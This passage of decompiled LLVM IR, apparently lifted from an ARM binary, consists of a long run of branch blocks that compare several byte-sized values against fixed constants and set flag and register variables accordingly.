bb1669:                                           ; preds = %dec_label_pc_f65c, %bb1668
  %v2_f664 = xor i1 %v7_f65c, true
  %v3_f664 = and i1 %v2_f65c, %v2_f664
  br i1 %v3_f664, label %bb1670, label %bb1671

bb1670:                                           ; preds = %bb1669
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1671

bb1671:                                           ; preds = %bb1669, %bb1670
  %v0_f670.pr = phi i32 [ 0, %bb1669 ], [ 1, %bb1670 ]
  %v2_f668 = icmp ugt i32 %v1_e874, 41
  store i1 %v2_f668, i1* %cpsr_c.global-to-local, align 1
  %v7_f668 = icmp eq i32 %v1_e874, 42
  store i1 %v7_f668, i1* %cpsr_z.global-to-local, align 1
  %v2_f66c = xor i1 %v7_f668, true
  %v3_f66c = and i1 %v2_f668, %v2_f66c
  br i1 %v3_f66c, label %.thread321, label %bb1672

.thread321:                                       ; preds = %bb1671
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f678

bb1672:                                           ; preds = %bb1671
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f670 = icmp eq i32 %v0_f670.pr, 0
  store i1 %v2_f670, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f670, label %dec_label_pc_f678, label %dec_label_pc_e858

dec_label_pc_f678:                                ; preds = %.thread321, %bb1672, %dec_label_pc_f644
  %v7_f678 = icmp eq i32 %v1_e85c, 185
  %.2026 = zext i1 %v7_f678 to i32
  %v2_f684 = icmp ugt i32 %v1_e870, 91
  store i1 %v2_f684, i1* %cpsr_c.global-to-local, align 1
  %v7_f684 = icmp eq i32 %v1_e870, 92
  store i1 %v7_f684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f684, label %bb1675, label %dec_label_pc_f6ac

bb1675:                                           ; preds = %dec_label_pc_f678
  %v2_f678 = icmp ugt i32 %v1_e85c, 184
  store i1 %v2_f678, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f678, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f678, label %dec_label_pc_f690, label %dec_label_pc_f6ac

dec_label_pc_f690:                                ; preds = %bb1675
  %v2_f690 = icmp ugt i32 %v1_e874, 218
  store i1 %v2_f690, i1* %cpsr_c.global-to-local, align 1
  %v7_f690 = icmp eq i32 %v1_e874, 219
  store i1 %v7_f690, i1* %cpsr_z.global-to-local, align 1
  %v2_f694 = xor i1 %v2_f690, true
  %v3_f694 = or i1 %v7_f690, %v2_f694
  br i1 %v3_f694, label %bb1676, label %bb1677

bb1676:                                           ; preds = %dec_label_pc_f690
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1677

bb1677:                                           ; preds = %dec_label_pc_f690, %bb1676
  %v2_f698 = xor i1 %v7_f690, true
  %v3_f698 = and i1 %v2_f690, %v2_f698
  br i1 %v3_f698, label %bb1678, label %bb1679

bb1678:                                           ; preds = %bb1677
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1679

bb1679:                                           ; preds = %bb1677, %bb1678
  %v0_f6a4.pr = phi i32 [ 0, %bb1677 ], [ 1, %bb1678 ]
  %v2_f69c = icmp ugt i32 %v1_e874, 221
  store i1 %v2_f69c, i1* %cpsr_c.global-to-local, align 1
  %v7_f69c = icmp eq i32 %v1_e874, 222
  store i1 %v7_f69c, i1* %cpsr_z.global-to-local, align 1
  %v2_f6a0 = xor i1 %v7_f69c, true
  %v3_f6a0 = and i1 %v2_f69c, %v2_f6a0
  br i1 %v3_f6a0, label %.thread327, label %bb1680

.thread327:                                       ; preds = %bb1679
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f6ac

bb1680:                                           ; preds = %bb1679
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6a4 = icmp eq i32 %v0_f6a4.pr, 0
  store i1 %v2_f6a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6a4, label %dec_label_pc_f6ac, label %dec_label_pc_e858

dec_label_pc_f6ac:                                ; preds = %dec_label_pc_f678, %.thread327, %bb1680, %bb1675
  store i32 %.2017, i32* %r3.global-to-local, align 4
  %v2_f6b0 = icmp ugt i32 %v1_e870, 237
  store i1 %v2_f6b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f6b0 = icmp eq i32 %v1_e870, 238
  store i1 %v7_f6b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6b0, label %.thread330, label %.thread331

.thread331:                                       ; preds = %dec_label_pc_f6ac
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f6d8

.thread330:                                       ; preds = %dec_label_pc_f6ac
  store i32 %.2017, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6bc = icmp eq i1 %v7_f2b4, false
  store i1 %v2_f6bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6bc, label %dec_label_pc_f6d8, label %dec_label_pc_f6c4

dec_label_pc_f6c4:                                ; preds = %.thread330
  %v2_f6c4 = icmp ugt i32 %v1_e874, 189
  store i1 %v2_f6c4, i1* %cpsr_c.global-to-local, align 1
  %v7_f6c4 = icmp eq i32 %v1_e874, 190
  store i1 %v7_f6c4, i1* %cpsr_z.global-to-local, align 1
  %v2_f6c8 = xor i1 %v7_f6c4, true
  %v3_f6c8 = and i1 %v2_f6c4, %v2_f6c8
  br i1 %v3_f6c8, label %bb1681, label %bb1682

bb1681:                                           ; preds = %dec_label_pc_f6c4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1682

bb1682:                                           ; preds = %dec_label_pc_f6c4, %bb1681
  %v0_f6d0935 = phi i32 [ %.2017, %dec_label_pc_f6c4 ], [ 0, %bb1681 ]
  %v2_f6cc = xor i1 %v2_f6c4, true
  %v3_f6cc = or i1 %v7_f6c4, %v2_f6cc
  br i1 %v3_f6cc, label %bb1683, label %bb1684

bb1683:                                           ; preds = %bb1682
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1684

bb1684:                                           ; preds = %bb1682, %bb1683
  %v0_f6d0 = phi i32 [ %v0_f6d0935, %bb1682 ], [ 1, %bb1683 ]
  %v2_f6d0 = and i32 %v3_e864, 64
  %v3_f6d0 = icmp ne i32 %v2_f6d0, 0
  store i1 %v3_f6d0, i1* %cpsr_c.global-to-local, align 1
  %v4_f6d0 = udiv i32 %v1_e874, 128
  %v5_f6d0 = and i32 %v0_f6d0, %v4_f6d0
  store i32 %v5_f6d0, i32* %r3.global-to-local, align 4
  %v6_f6d0 = icmp eq i32 %v5_f6d0, 0
  store i1 %v6_f6d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_f6d0, label %dec_label_pc_f6d8, label %dec_label_pc_e858

dec_label_pc_f6d8:                                ; preds = %.thread331, %bb1684, %.thread330
  store i32 %.2000, i32* %r3.global-to-local, align 4
  %v2_f6dc = icmp ugt i32 %v1_e870, 221
  store i1 %v2_f6dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f6dc = icmp eq i32 %v1_e870, 222
  store i1 %v7_f6dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f6dc, label %.thread334, label %.thread335

.thread335:                                       ; preds = %dec_label_pc_f6d8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f708

.thread334:                                       ; preds = %dec_label_pc_f6d8
  store i32 %.2000, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6e8 = icmp eq i1 %v7_ec9c, false
  store i1 %v2_f6e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6e8, label %dec_label_pc_f708, label %dec_label_pc_f6f0

dec_label_pc_f6f0:                                ; preds = %.thread334
  store i32 %v1_e874, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6f0 = icmp eq i32 %v1_e874, 0
  store i1 %v2_f6f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f6f0, label %bb1686, label %bb1685

bb1685:                                           ; preds = %dec_label_pc_f6f0
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1686

bb1686:                                           ; preds = %dec_label_pc_f6f0, %bb1685
  %v0_f700.pr = phi i32 [ 0, %dec_label_pc_f6f0 ], [ 1, %bb1685 ]
  %v2_f6f8 = icmp ugt i32 %v1_e874, 29
  store i1 %v2_f6f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f6f8 = icmp eq i32 %v1_e874, 30
  store i1 %v7_f6f8, i1* %cpsr_z.global-to-local, align 1
  %v2_f6fc = xor i1 %v7_f6f8, true
  %v3_f6fc = and i1 %v2_f6f8, %v2_f6fc
  br i1 %v3_f6fc, label %.thread339, label %bb1687

.thread339:                                       ; preds = %bb1686
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f708

bb1687:                                           ; preds = %bb1686
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f700 = icmp eq i32 %v0_f700.pr, 0
  store i1 %v2_f700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f700, label %dec_label_pc_f708, label %dec_label_pc_e858

dec_label_pc_f708:                                ; preds = %.thread339, %.thread335, %bb1687, %.thread334
  %v7_f708 = icmp eq i32 %v1_e85c, 208
  %.2027 = zext i1 %v7_f708 to i32
  store i32 %.2027, i32* %r3.global-to-local, align 4
  store i1 %v2_efd8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_efd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_efd8, label %bb1690, label %dec_label_pc_f740

bb1690:                                           ; preds = %dec_label_pc_f708
  %v2_f708 = icmp ugt i32 %v1_e85c, 207
  store i1 %v2_f708, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f708, label %dec_label_pc_f724, label %dec_label_pc_f740

dec_label_pc_f724:                                ; preds = %bb1690
  %v2_f724 = icmp ugt i32 %v1_e874, 230
  store i1 %v2_f724, i1* %cpsr_c.global-to-local, align 1
  %v7_f724 = icmp eq i32 %v1_e874, 231
  store i1 %v7_f724, i1* %cpsr_z.global-to-local, align 1
  %v2_f728 = xor i1 %v2_f724, true
  %v3_f728 = or i1 %v7_f724, %v2_f728
  br i1 %v3_f728, label %bb1691, label %bb1692

bb1691:                                           ; preds = %dec_label_pc_f724
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1692

bb1692:                                           ; preds = %dec_label_pc_f724, %bb1691
  %v0_f738.pr940 = phi i32 [ %.2027, %dec_label_pc_f724 ], [ 0, %bb1691 ]
  %v2_f72c = xor i1 %v7_f724, true
  %v3_f72c = and i1 %v2_f724, %v2_f72c
  br i1 %v3_f72c, label %bb1693, label %bb1694

bb1693:                                           ; preds = %bb1692
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1694

bb1694:                                           ; preds = %bb1692, %bb1693
  %v0_f738.pr = phi i32 [ %v0_f738.pr940, %bb1692 ], [ 1, %bb1693 ]
  %v2_f730 = icmp ugt i32 %v1_e874, 250
  store i1 %v2_f730, i1* %cpsr_c.global-to-local, align 1
  %v7_f730 = icmp eq i32 %v1_e874, 251
  store i1 %v7_f730, i1* %cpsr_z.global-to-local, align 1
  %v2_f734 = xor i1 %v7_f730, true
  %v3_f734 = and i1 %v2_f730, %v2_f734
  br i1 %v3_f734, label %.thread347, label %bb1695

.thread347:                                       ; preds = %bb1694
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f740

bb1695:                                           ; preds = %bb1694
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f738 = icmp eq i32 %v0_f738.pr, 0
  store i1 %v2_f738, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f738, label %dec_label_pc_f740, label %dec_label_pc_e858

dec_label_pc_f740:                                ; preds = %dec_label_pc_f708, %.thread347, %bb1695, %bb1690
  store i32 %.1997, i32* %r3.global-to-local, align 4
  %v2_f744 = icmp ugt i32 %v1_e85c, 65
  store i1 %v2_f744, i1* %cpsr_c.global-to-local, align 1
  %v7_f744 = icmp eq i32 %v1_e85c, 66
  %.2028 = zext i1 %v7_f744 to i32
  %v2_f750 = and i32 %.1997, %.2028
  %v4_f750 = icmp eq i32 %v2_f750, 0
  store i1 %v4_f750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f750, label %dec_label_pc_f770, label %dec_label_pc_f75c

dec_label_pc_f75c:                                ; preds = %dec_label_pc_f740
  %v2_f75c = icmp ugt i32 %v1_e874, 157
  store i1 %v2_f75c, i1* %cpsr_c.global-to-local, align 1
  %v7_f75c = icmp eq i32 %v1_e874, 158
  store i1 %v7_f75c, i1* %cpsr_z.global-to-local, align 1
  %v2_f760 = xor i1 %v7_f75c, true
  %v3_f760 = and i1 %v2_f75c, %v2_f760
  br i1 %v3_f760, label %bb1698, label %bb1699

bb1698:                                           ; preds = %dec_label_pc_f75c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1699

bb1699:                                           ; preds = %dec_label_pc_f75c, %bb1698
  %v0_f768943 = phi i32 [ %.1997, %dec_label_pc_f75c ], [ 0, %bb1698 ]
  %v2_f764 = xor i1 %v2_f75c, true
  %v3_f764 = or i1 %v7_f75c, %v2_f764
  br i1 %v3_f764, label %bb1700, label %bb1701

bb1700:                                           ; preds = %bb1699
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1701

bb1701:                                           ; preds = %bb1699, %bb1700
  %v0_f768 = phi i32 [ %v0_f768943, %bb1699 ], [ 1, %bb1700 ]
  %v2_f768 = and i32 %v3_e864, 64
  %v3_f768 = icmp ne i32 %v2_f768, 0
  store i1 %v3_f768, i1* %cpsr_c.global-to-local, align 1
  %v4_f768 = udiv i32 %v1_e874, 128
  %v5_f768 = and i32 %v0_f768, %v4_f768
  store i32 %v5_f768, i32* %r3.global-to-local, align 4
  %v6_f768 = icmp eq i32 %v5_f768, 0
  store i1 %v6_f768, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_f768, label %dec_label_pc_f770, label %dec_label_pc_e858

dec_label_pc_f770:                                ; preds = %bb1701, %dec_label_pc_f740
  store i32 %.2019, i32* %r3.global-to-local, align 4
  store i1 %v2_ed04, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ed04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ed04, label %.thread351, label %.thread352

.thread352:                                       ; preds = %dec_label_pc_f770
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f7a0

.thread351:                                       ; preds = %dec_label_pc_f770
  store i32 %.2019, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f780 = icmp eq i1 %v7_f338, false
  store i1 %v2_f780, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f780, label %dec_label_pc_f7a0, label %dec_label_pc_f788

dec_label_pc_f788:                                ; preds = %.thread351
  store i32 %v1_e874, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f788 = icmp eq i32 %v1_e874, 0
  store i1 %v2_f788, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f788, label %bb1703, label %bb1702

bb1702:                                           ; preds = %dec_label_pc_f788
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1703

bb1703:                                           ; preds = %dec_label_pc_f788, %bb1702
  %v0_f798.pr = phi i32 [ 0, %dec_label_pc_f788 ], [ 1, %bb1702 ]
  %v2_f790 = icmp ugt i32 %v1_e874, 125
  store i1 %v2_f790, i1* %cpsr_c.global-to-local, align 1
  %v7_f790 = icmp eq i32 %v1_e874, 126
  store i1 %v7_f790, i1* %cpsr_z.global-to-local, align 1
  %v2_f794 = xor i1 %v7_f790, true
  %v3_f794 = and i1 %v2_f790, %v2_f794
  br i1 %v3_f794, label %.thread356, label %bb1704

.thread356:                                       ; preds = %bb1703
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f7a0

bb1704:                                           ; preds = %bb1703
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f798 = icmp eq i32 %v0_f798.pr, 0
  store i1 %v2_f798, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f798, label %dec_label_pc_f7a0, label %dec_label_pc_e858

dec_label_pc_f7a0:                                ; preds = %.thread356, %.thread352, %bb1704, %.thread351
  %v2_f7a0 = icmp ugt i32 %v1_e85c, 215
  store i1 %v2_f7a0, i1* %cpsr_c.global-to-local, align 1
  %v7_f7a0 = icmp eq i32 %v1_e85c, 216
  store i1 %v7_f7a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7a0, label %.thread359, label %.thread360

.thread360:                                       ; preds = %dec_label_pc_f7a0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f7c8

.thread359:                                       ; preds = %dec_label_pc_f7a0
  store i32 %.2025, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f7ac = icmp eq i1 %v7_f010, false
  store i1 %v2_f7ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f7ac, label %dec_label_pc_f7c8, label %dec_label_pc_f7b4

dec_label_pc_f7b4:                                ; preds = %.thread359
  %v2_f7b4 = icmp ugt i32 %v1_e874, 157
  store i1 %v2_f7b4, i1* %cpsr_c.global-to-local, align 1
  %v7_f7b4 = icmp eq i32 %v1_e874, 158
  store i1 %v7_f7b4, i1* %cpsr_z.global-to-local, align 1
  %v2_f7b8 = xor i1 %v7_f7b4, true
  %v3_f7b8 = and i1 %v2_f7b4, %v2_f7b8
  br i1 %v3_f7b8, label %bb1705, label %bb1706

bb1705:                                           ; preds = %dec_label_pc_f7b4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1706

bb1706:                                           ; preds = %dec_label_pc_f7b4, %bb1705
  %v0_f7c0947 = phi i32 [ %.2025, %dec_label_pc_f7b4 ], [ 0, %bb1705 ]
  %v2_f7bc = xor i1 %v2_f7b4, true
  %v3_f7bc = or i1 %v7_f7b4, %v2_f7bc
  br i1 %v3_f7bc, label %bb1707, label %bb1708

bb1707:                                           ; preds = %bb1706
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1708

bb1708:                                           ; preds = %bb1706, %bb1707
  %v0_f7c0 = phi i32 [ %v0_f7c0947, %bb1706 ], [ 1, %bb1707 ]
  %v2_f7c0 = and i32 %v3_e864, 64
  %v3_f7c0 = icmp ne i32 %v2_f7c0, 0
  store i1 %v3_f7c0, i1* %cpsr_c.global-to-local, align 1
  %v4_f7c0 = udiv i32 %v1_e874, 128
  %v5_f7c0 = and i32 %v0_f7c0, %v4_f7c0
  store i32 %v5_f7c0, i32* %r3.global-to-local, align 4
  %v6_f7c0 = icmp eq i32 %v5_f7c0, 0
  store i1 %v6_f7c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_f7c0, label %dec_label_pc_f7c8, label %dec_label_pc_e858

dec_label_pc_f7c8:                                ; preds = %.thread360, %bb1708, %.thread359
  %v2_f7c8 = icmp ugt i32 %v1_e870, 60
  %v7_f7c8 = icmp eq i32 %v1_e870, 61
  %.2029 = zext i1 %v7_f7c8 to i32
  store i32 %.2029, i32* %r4.global-to-local, align 4
  %v2_f7d4 = icmp ugt i32 %v1_e85c, 107
  store i1 %v2_f7d4, i1* %cpsr_c.global-to-local, align 1
  %v7_f7d4 = icmp eq i32 %v1_e85c, 108
  store i1 %v7_f7d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7d4, label %bb1711, label %dec_label_pc_f7e0

bb1711:                                           ; preds = %dec_label_pc_f7c8
  store i1 %v2_f7c8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f7c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7c8, label %dec_label_pc_e858, label %dec_label_pc_f7e0

dec_label_pc_f7e0:                                ; preds = %dec_label_pc_f7c8, %bb1711
  store i32 %.2019, i32* %r3.global-to-local, align 4
  %v2_f7e4 = icmp ugt i32 %v1_e870, 75
  store i1 %v2_f7e4, i1* %cpsr_c.global-to-local, align 1
  %v7_f7e4 = icmp eq i32 %v1_e870, 76
  store i1 %v7_f7e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7e4, label %.thread365, label %.thread366

.thread366:                                       ; preds = %dec_label_pc_f7e0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f7f8

.thread365:                                       ; preds = %dec_label_pc_f7e0
  store i32 %.2019, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f7f0 = icmp eq i1 %v7_f338, false
  store i1 %v2_f7f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f7f0, label %dec_label_pc_f7f8, label %dec_label_pc_e858

dec_label_pc_f7f8:                                ; preds = %.thread366, %.thread365
  %v2_f7f8 = icmp ugt i32 %v1_e870, 10
  store i1 %v2_f7f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f7f8 = icmp eq i32 %v1_e870, 11
  store i1 %v7_f7f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7f8, label %.thread369, label %.thread370

.thread370:                                       ; preds = %dec_label_pc_f7f8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f828

.thread369:                                       ; preds = %dec_label_pc_f7f8
  store i32 %.2026, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f804 = icmp eq i1 %v7_f678, false
  store i1 %v2_f804, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f804, label %dec_label_pc_f828, label %dec_label_pc_f80c

dec_label_pc_f80c:                                ; preds = %.thread369
  %v2_f80c = icmp ugt i32 %v1_e874, 142
  store i1 %v2_f80c, i1* %cpsr_c.global-to-local, align 1
  %v7_f80c = icmp eq i32 %v1_e874, 143
  store i1 %v7_f80c, i1* %cpsr_z.global-to-local, align 1
  %v2_f810 = xor i1 %v2_f80c, true
  %v3_f810 = or i1 %v7_f80c, %v2_f810
  br i1 %v3_f810, label %bb1712, label %bb1713

bb1712:                                           ; preds = %dec_label_pc_f80c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1713

bb1713:                                           ; preds = %dec_label_pc_f80c, %bb1712
  %v0_f820.pr951 = phi i32 [ %.2026, %dec_label_pc_f80c ], [ 0, %bb1712 ]
  %v2_f814 = xor i1 %v7_f80c, true
  %v3_f814 = and i1 %v2_f80c, %v2_f814
  br i1 %v3_f814, label %bb1714, label %bb1715

bb1714:                                           ; preds = %bb1713
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1715

bb1715:                                           ; preds = %bb1713, %bb1714
  %v0_f820.pr = phi i32 [ %v0_f820.pr951, %bb1713 ], [ 1, %bb1714 ]
  %v2_f818 = icmp ugt i32 %v1_e874, 146
  store i1 %v2_f818, i1* %cpsr_c.global-to-local, align 1
  %v7_f818 = icmp eq i32 %v1_e874, 147
  store i1 %v7_f818, i1* %cpsr_z.global-to-local, align 1
  %v2_f81c = xor i1 %v7_f818, true
  %v3_f81c = and i1 %v2_f818, %v2_f81c
  br i1 %v3_f81c, label %.thread374, label %bb1716

.thread374:                                       ; preds = %bb1715
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f828

bb1716:                                           ; preds = %bb1715
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f820 = icmp eq i32 %v0_f820.pr, 0
  store i1 %v2_f820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f820, label %dec_label_pc_f828, label %dec_label_pc_e858

dec_label_pc_f828:                                ; preds = %.thread374, %.thread370, %bb1716, %.thread369
  %v2_f82c = and i32 %.1998, %.2026
  %v4_f82c = icmp eq i32 %v2_f82c, 0
  store i1 %v4_f82c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f82c, label %dec_label_pc_f850, label %dec_label_pc_f834

dec_label_pc_f834:                                ; preds = %dec_label_pc_f828
  %v2_f834 = icmp ugt i32 %v1_e874, 19
  store i1 %v2_f834, i1* %cpsr_c.global-to-local, align 1
  %v7_f834 = icmp eq i32 %v1_e874, 20
  store i1 %v7_f834, i1* %cpsr_z.global-to-local, align 1
  %v2_f838 = xor i1 %v2_f834, true
  %v3_f838 = or i1 %v7_f834, %v2_f838
  br i1 %v3_f838, label %bb1717, label %bb1718

bb1717:                                           ; preds = %dec_label_pc_f834
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1718

bb1718:                                           ; preds = %dec_label_pc_f834, %bb1717
  %v2_f83c = xor i1 %v7_f834, true
  %v3_f83c = and i1 %v2_f834, %v2_f83c
  br i1 %v3_f83c, label %bb1719, label %bb1720

bb1719:                                           ; preds = %bb1718
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1720

bb1720:                                           ; preds = %bb1718, %bb1719
  %v0_f848.pr = phi i32 [ 0, %bb1718 ], [ 1, %bb1719 ]
  %v2_f840 = icmp ugt i32 %v1_e874, 21
  store i1 %v2_f840, i1* %cpsr_c.global-to-local, align 1
  %v7_f840 = icmp eq i32 %v1_e874, 22
  store i1 %v7_f840, i1* %cpsr_z.global-to-local, align 1
  %v2_f844 = xor i1 %v7_f840, true
  %v3_f844 = and i1 %v2_f840, %v2_f844
  br i1 %v3_f844, label %.thread378, label %bb1721

.thread378:                                       ; preds = %bb1720
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f850

bb1721:                                           ; preds = %bb1720
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f848 = icmp eq i32 %v0_f848.pr, 0
  store i1 %v2_f848, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f848, label %dec_label_pc_f850, label %dec_label_pc_e858

dec_label_pc_f850:                                ; preds = %.thread378, %bb1721, %dec_label_pc_f828
  %v2_f850 = and i32 %.2029, %.2026
  %v4_f850 = icmp eq i32 %v2_f850, 0
  store i1 %v4_f850, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f850, label %dec_label_pc_f874, label %dec_label_pc_f858

dec_label_pc_f858:                                ; preds = %dec_label_pc_f850
  %v2_f858 = icmp ugt i32 %v1_e874, 134
  store i1 %v2_f858, i1* %cpsr_c.global-to-local, align 1
  %v7_f858 = icmp eq i32 %v1_e874, 135
  store i1 %v7_f858, i1* %cpsr_z.global-to-local, align 1
  %v2_f85c = xor i1 %v2_f858, true
  %v3_f85c = or i1 %v7_f858, %v2_f85c
  br i1 %v3_f85c, label %bb1722, label %bb1723

bb1722:                                           ; preds = %dec_label_pc_f858
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1723

bb1723:                                           ; preds = %dec_label_pc_f858, %bb1722
  %v2_f860 = xor i1 %v7_f858, true
  %v3_f860 = and i1 %v2_f858, %v2_f860
  br i1 %v3_f860, label %bb1724, label %bb1725

bb1724:                                           ; preds = %bb1723
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1725

bb1725:                                           ; preds = %bb1723, %bb1724
  %v0_f86c.pr = phi i32 [ 0, %bb1723 ], [ 1, %bb1724 ]
  %v2_f864 = icmp ugt i32 %v1_e874, 137
  store i1 %v2_f864, i1* %cpsr_c.global-to-local, align 1
  %v7_f864 = icmp eq i32 %v1_e874, 138
  store i1 %v7_f864, i1* %cpsr_z.global-to-local, align 1
  %v2_f868 = xor i1 %v7_f864, true
  %v3_f868 = and i1 %v2_f864, %v2_f868
  br i1 %v3_f868, label %.thread382, label %bb1726

.thread382:                                       ; preds = %bb1725
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f874

bb1726:                                           ; preds = %bb1725
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f86c = icmp eq i32 %v0_f86c.pr, 0
  store i1 %v2_f86c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f86c, label %dec_label_pc_f874, label %dec_label_pc_e858

dec_label_pc_f874:                                ; preds = %.thread382, %bb1726, %dec_label_pc_f850
  store i32 %storemerge1255, i32* %r3.global-to-local, align 4
  %v2_f878 = and i32 %storemerge1255, %.2026
  %v4_f878 = icmp eq i32 %v2_f878, 0
